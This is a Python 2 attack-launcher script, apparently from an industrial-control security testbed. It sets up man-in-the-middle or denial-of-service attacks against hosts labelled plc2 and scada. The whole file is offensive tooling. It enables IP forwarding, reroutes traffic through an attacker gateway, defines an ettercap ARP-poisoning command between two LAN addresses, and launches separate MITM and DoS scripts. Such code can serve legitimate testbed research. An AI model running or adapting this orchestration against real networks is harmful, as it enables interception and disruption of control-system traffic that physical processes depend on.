import subprocess
import shlex
import argparse
import sys

class MitmAttack():
    def start_forwarding(self):
        args = shlex.split("sysctl -w net.ipv4.ip_forward=1")
        subprocess.call(args, shell=False)

    def configure_routing(self):
        if self.target == 'scada':
            subprocess.call(['route', 'add', 'default', 'gw', '192.168.2.254', 'attacker2-eth0'], shell=False)

    def launch_ettercap(self):
        args = shlex.split("ettercap -o -q -T -M arp /192.168.1.10// /192.168.1.20//")
        subprocess.Popen(args)

    def launch_mitm(self):
        print 'Running MiTM attack...'
        if self.target == 'plc2':
            mitm = subprocess.Popen(["../../../attack-experiments/env/bin/python", 'mitm_test.py', self.target])

        elif self.target == 'scada':
            self.configure_routing()
            mitm = subprocess.Popen(["../../../attack-experiments/env/bin/python", 'mitm_test.py', self.target])

        else:
            print 'Invalid target, stopped'

        return mitm

    def launch_dos(self):
        print 'Running DoS attack...'
        dos = subprocess.Popen(["../../../attack-experiments/env/bin/python", 'dos.py'])
        return dos

    def main(self):
        args = self.get_arguments()
        self.process_arguments(args)

        if self.attack == "mitm":
            self.start_forwarding()
            mitm = self.launch_mitm()
            mitm.wait()

        elif self.attack == "dos":
            self.start_forwarding()
            dos  = self.launch_dos()
            dos.wait()
        else:
            print 'No attack was specified, exiting...'
            sys.exit(1)

    def process_arguments(self,arg_parser):
        if arg_parser.attack:
            self.attack = arg_parser.attack
        else:
            self.attack = 'mitm'

        if arg_parser.target:
            self.target = arg_parser.target
        else:
            self.target = 'plc2'

    def get_arguments(self):
        parser = argparse.ArgumentParser(description='Master Script that launches LAN communication attacks')
        parser.add_argument("--attack", "-a",help="Attack to be launched, options can be mitm or dos")
        parser.add_argument("--target", "-t", help="target of the attack, current valid values are plc2 or scada")
        return parser.parse_args()

if __name__ == "__main__":
    mitm = MitmAttack()
    mitm.main()